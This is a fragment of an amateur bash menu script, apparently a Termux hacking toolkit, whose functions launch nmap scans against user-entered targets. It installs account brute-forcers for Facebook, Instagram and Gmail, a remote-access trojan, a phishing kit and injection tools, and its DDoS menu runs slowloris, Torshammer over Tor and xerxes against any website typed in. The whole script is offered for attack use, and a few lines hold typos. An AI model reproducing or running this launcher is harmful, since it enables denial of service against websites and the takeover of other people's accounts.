		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -Pn $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 5 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		read -p "Enter The Port : " port 
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -p $port $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 6 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -sV $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 7 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target (ex:google.com): " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -6 -A  $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 8 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target or web : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -R $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 9 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -Pn -sn $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 10 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -sS -sU $ip 
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 11 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		sudo nmap -sL $ip 	
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 12 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap -PS $ip ;echo "Ex>(google.com)"
		echo -e -n "$yellow 			protocol list > " ;read pl ; nmap -PO $pl 
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 13 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		sudo nmap -sM $ip 
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 14 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		sudo nmap -sO $ip 
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 0 ]; then
		clear
		echo -e $green
		figlet "		MOHAMED"
		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
		sleep 0.2
		echo -e "$yellow By : $green MOHAMED $cyan HACKER"
		sleep 0.2
		echo -e "$yellow Telegram $red @HcmohtatefOfficial"
		sleep 0.2
		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
		sleep 2
		rasma
		main
	else :
		nmap-p
	fi
}

TOoLs(){
	clear
	echo -e """
		$red ▄▄▄▄▄▄▄▄    ▄▄▄▄              ▄▄       $green▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄ 
		$red ▀▀▀██▀▀▀   ██▀▀██             ██       $green██    ██    ████    ██  ██▀  
		$red    ██     ██    ██   ▄████▄   ██       $green██    ██    ████    ██▄██    
		$red    ██     ██    ██  ██▀  ▀██  ██       $green████████   ██  ██   █████    
		$red    ██     ██    ██  ██    ██  ██       $green██    ██   ██████   ██  ██▄  
		$red    ██      ██▄▄██   ▀██▄▄██▀  ██▄▄▄▄▄▄ $green██    ██  ▄██  ██▄  ██   ██▄ 
		$red    ▀▀       ▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀▀▀▀ $green▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀ """
		echo -e $red"		----------------------------------$yellow}$cyan TOoL $yellow{$red------------------------------\n\n"
	sleep 3
	printf "$yellow [ $red 1 $yellow ] $cyan WPSeku \n"
	sleep 0.2
	printf "$yellow [ $red 2 $yellow ] $cyan InjeCtor-SY\n"
	sleep 0.2
	printf "$yellow [ $red 3 $yellow ] $cyan 0xSQLiNJ\n"
	sleep 0.2
	printf "$yellow [ $red 4 $yellow ] $cyan sqlmap\n"
	sleep 0.2
	printf "$yellow [ $red 5 $yellow ] $cyan Xshell\n"
	sleep 0.2
	printf "$yellow [ $red 6 $yellow ] $cyan XAttacker\n"
	sleep 0.2
	printf "$yellow [ $red 7 $yellow ] $cyan OWScan\n"
	sleep 0.2
	printf "$yellow [ $red 8 $yellow ] $cyan Breacher\n"
	sleep 0.2
	printf "$yellow [ $red 9 $yellow ] $cyan Nmap\n"
	sleep 0.2
	printf "$yellow [ $red 10 $yellow ] $cyan TXTool\n"
	sleep 0.2
	printf "$yellow [ $red 11 $yellow ] $cyan A-Rat\n"
	sleep 0.2
	printf "$yellow [ $red 12 $yellow ] $cyan Facebook Brute\n"
	sleep 0.2
	printf "$yellow [ $red 13 $yellow ] $cyan InstaHack\n"
	sleep 0.2
	printf "$yellow [ $red 14 $yellow ] $cyan gmail_attacker\n"
	sleep 0.2
	printf "$yellow [ $red 15 $yellow ] $cyan Hash Buster\n"
	sleep 0.2
	printf "$yellow [ $red 16 $yellow ] $cyan weeman\n"
	sleep 0.2
	printf "$yellow [ $red 17 $yellow ] $cyan wifite\n"
	sleep 0.2
	printf "$yellow [ $red 18 $yellow ] $cyan Sudo\n"
	sleep 0.2
	printf "$yellow [ $red 19 $yellow ] $cyan Ubuntu\n"
	sleep 0.2
	printf "$yellow [ $red 20 $yellow ] $cyan Fedora\n"
	sleep 0.2
	printf "$yellow [ $red 00 $yellow ] $cyan Back\n"
	printf "$white"
	echo
	read -p "[ H_A_K_5 / TOoL ]~# " tool
	if [ $tool = 1 ];then
		clear
		echo -e $red
		figlet "WPSeku"
		cd ~
		git clone https://github.com/m4ll0k/WPSeku.git
		TOoLs
	elif [ $tool = 2 ]; then
		clear		
		echo -e $red
		figlet "InjeCtor-SY"
		cd ~
		git clone https://github.com/omarsalloum/InjeCtor-SY.git
		TOoLs
	elif [ $tool = 3  ]; then
		clear
		echo -e $red
		figlet "0xSQLiNJ"
		cd ~
		git clone https://github.com/0xAbdullah/0xSQLiNJ
		TOoLs
	elif [ $tool = 4 ]; then
		clear
		echo -e $red
		figlet "sqlmap"
		cd ~
		git clone https://github.com/sqlmapproject/sqlmap
		TOoLs
	elif [ $tool = 5 ]; then
		clear
		echo -e $red
		figlet "Xshell"
		cd ~
		git clone clone https://github.com/Ubaii/Xshell
		TOoLs
	elif [ $tool = 6 ]; then
		clear
		figlet "XAttacker"
		cd ~
		git clone https://github.com/Moham3dRiahi/XAttacker
		TOoLs
	elif [ $tool = 7 ]; then
		clear
		echo -e $red
		figlet "OWScan"
		cd ~
		git clone https://github.com/Gameye98/OWScan
		TOoLs
	elif [ $tool = 8 ]; then
		clear
		echo -e $red
		figlet "Breacher"
		cd ~
		git clone https://github.com/UltimateHackers/Breacher
		TOoLs
	elif [ $tool = 9 ]; then
		clear
		echo -e $red
		figlet "Nmap"
		cd ~
		apt update && apt upgrade
		pkg install nmap -y
		TOoLs
	elif [ $tool = 10 ]; then
		clear
		echo -e $red
		figlet "Txtool"
		cd ~
		git clone https://github.com/kuburan/txtool
		TOoLs
	elif [ $tool = 11 ]; then
		clear
		echo -e $red
		figlet "A-RAT"
		cd ~
		git clone https://github.com/Xi4u7/A-Rat
		TOoLs
	elif [ $tool = 12 ]; then
		clear
		echo -e $red
		figlet "Facebook Brute"
		cd ~
		git clone https://github.com/HackerAdana/facebook-brute-force.git
		TOoLs
	elif [ $tool = 13 ]; then
		echo -e $red
		figlet "InstaHack"
		cd ~
		apt update && apt upgrade
		apt install python2 git
		pip2 install requests
		git clone https://github.com/avramit/instahack
		TOoLs
	elif [ $tool = 14 ]; then
		clear
		echo -e $red
		figlet "gmail_attacker"
		cd ~
		git clone https://github.com/AyoubSirai/gmail_attacker.git
		TOoLs
	elif [ $tool = 15 ]; then
		clear
		echo -e $red
		figlet "Hash Buster"
		cd ~
		git clone https://github.com/UltimateHackers/Hash-Buster.git
		TOoLs
	elif [ $tool = 16  ]; then
		clear
		echo -e $red
		figlet "weeman"
		cd ~
		git clone https://github.com/evait-security/weeman.git
		TOoLs
	elif [ $tool = 17 ]; then
		clear
		echo -e $red
		figlet "wifite"
		cd ~
		wget https://raw.github.com/derv82/wifite/master/wifite.py
		TOoLs
	elif [ $tool = 18 ]; then
		clear
		echo -e $reed
		figlet "Sudo"
		cd ~
		git clone https://github.com/st42/termux-sudo
		TOoLs
	elif [ $tool = 19 ]; then
		clear
		echo -e $red
		figlet "Ubuntu"
		cd ~
		git clone https://github.com/Neo-Oli/termux-ubuntu
		TOoLs
	elif [ $tool = 20 ]; then
		clear
		echo -e $red
		figlet "Fedora"
		cd ~
		wget https://raw.githubusercontent.com/nmilosev/termux-fedora/master/termux-fedora.sh
		TOoLs
	elif [ $tool = 0 ] || [ $tool = 00 ]; then
		rasma
		main
	else :
		TOoLs
	fi
}
ip(){
	clear
	figlet IP
	echo
	ip=$(ifconfig wlan0 | grep -o 192..........)
	ip2=$(ifconfig eth0 | grep -o 192..........)
	echo -e "		$red The IP UTP $green(Wlan)$yellow>> $cyan $ip\n "
	echo -e "		$red The IP UTP $green(date)$yellow>> $cyan $ip2\n "
	echo -e "		$red The IP TCP $green$yellow>> $cyan $my_ip\n "
	echo -e -n "			Enter Any key To Exit ";read Enter
	rasma
	main	
}
ddos(){
	clear
	echo -e """

		$red ▄▄▄▄▄   $blue  ▄▄▄▄▄   $cyan    ▄▄▄▄  $white    ▄▄▄▄   
		$red ██▀▀▀██ $blue  ██▀▀▀██ $cyan   ██▀▀██ $white  ▄█▀▀▀▀█  
		$red ██    ██$blue  ██    ██$cyan  ██    ██$white  ██▄      
		$red ██    ██$blue  ██    ██$cyan  ██    ██$white   ▀████▄  
		$red ██    ██$blue  ██    ██$cyan  ██    ██$white       ▀██ 
		$red ██▄▄▄██ $blue  ██▄▄▄██ $cyan   ██▄▄██ $white  █▄▄▄▄▄█▀ 
	 	$red ▀▀▀▀▀   $blue  ▀▀▀▀▀   $cyan    ▀▀▀▀  $white   ▀▀▀▀▀   """
	echo -e $red"----------------------------------$yellow}$cyan DDos $yellow{$red------------------------------\n\n"	
	echo -e "$white[$red 1 $white] $green ToR\n" ;sleep 0.2
	echo -e "$white[$red 2 $white] $green slowloris\n"  ;sleep 0.2
	echo -e "$white[$red 3 $white] $green Hammer\n" ;sleep 0.2
	echo -e "$white[$red 4 $white] $green xerxes\n" ;sleep 0.2
	echo -e "$white[$red 0 $white] $green Back\n" ;sleep 0.2
	echo -e $white
	read -p "[ H_A_K_5 / DDos ]~# " ddos
	if [ $ddos = 1 ];then
		clear 
		figlet ToR
		echo -e -n "$blue Do you want run Tor in the Termainl $red($yellow y/n $red) " ;read ToR
		if [ "$ToR" = "y" ] || [ "$ToR" = "Y" ];then
			clear
			figlet ToR
			echo -e "\n$red Firset go To $green[etc/proxychains.conf]"
			echo -e "$red and edit and choase the $yellow[strict_chain] $white BY:> remove (#) "
			echo -e -n "$red when you done $yellow[Enter to contnet]" ; read Enter
			service tor start
			proxychains firefox
			bash .model/.tor.sh
		elif [ "$ToR" = "n" ] || [ "$ToR" = "N" ];then
			ddos
		else :
			ddos
		fi
	elif [ $ddos = 2 ]; then
		clear
		figlet slowloris
		echo -n -e "$green Enter the Website to Attack :$red " ;read site
		echo -n -e "$green Enter the PortS :$red " ;read port
		echo -n -e "$green Enter the socet :$red " ;read socet
		python3 .model/.slowloris/slowloris.py $site -p $port -s $socet -v -ua
		echo -e -n "$red 			Enter Any key To Exit ";read Enter ; ddos
	elif [ $ddos = 3 ]; then
		clear
		figlet Hammer
		echo -n -e "$green Enter the Website to Attack :$red " ;read site
		echo -n -e "$green Enter the socet :$red " ;read socet
		python2 .model/.torshammer/torshammer.py --tor -t $site -r $socet -T
	elif [ $ddos = 4  ]; then
		clear
		figlet xerxes
		echo -n -e "$green Enter the Website to Attack :$red " ;read site
		cd .model/.xerxes
		./xerxes $site 80
		echo -e -n "$red 			Enter Any key To Exit ";read Enter ; ddos
	elif [ $ddos = 0 ]; then
		rasma
		main
	else :
		ddos
	fi
}
serve (){
	clear 
	figlet service
	echo 
	echo -e "$green Wating For Starting.. " ;sleep 3
	apachectl
	clear
	figlet service
	echo
	echo -e "$redThe Service Start.."
	termux-open http://localhost:8080
	echo -e -n "$red 				Enter Any key To Exit " ;read Enter
	rasma
	main
}
exit(){
	clear
	echo -e """                                                                                
			$cyan ▄▄▄▄▄▄▄▄               ██     ▄▄▄▄▄▄▄▄$white  ▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄  ▄▄▄▄▄▄▄  
			$cyan ██▀▀▀▀▀▀               ▀▀     ▀▀▀██▀▀▀$white  ██    ██    ████    ██  ██▀   ██▀▀▀▀▀  
			$cyan ██        ▀██  ██▀   ████        ██   $white  ██    ██    ████    ██▄██     ██▄▄▄▄   
			$cyan ███████     ████       ██        ██   $white  ████████   ██  ██   █████     █▀▀▀▀██▄ 
			$cyan ██          ▄██▄       ██        ██   $white  ██    ██   ██████   ██  ██▄         ██ 
			$cyan ██▄▄▄▄▄▄   ▄█▀▀█▄   ▄▄▄██▄▄▄     ██   $white  ██    ██  ▄██  ██▄  ██   ██▄  █▄▄▄▄██▀ 
			$cyan ▀▀▀▀▀▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀▀▀▀▀▀     ▀▀   $white  ▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀   ▀▀▀▀▀   """

	echo -e "$red++++++++++++++++++++++++++++++++++++++" 
	sleep 0.2
	echo -e "$yellow By : $green MOHAMED $cyan HACKER"
	sleep 0.2
	echo -e "$yellow Telegram $red @HcmohtatefOfficial"
	sleep 0.2
	echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			                                                                                
}
main


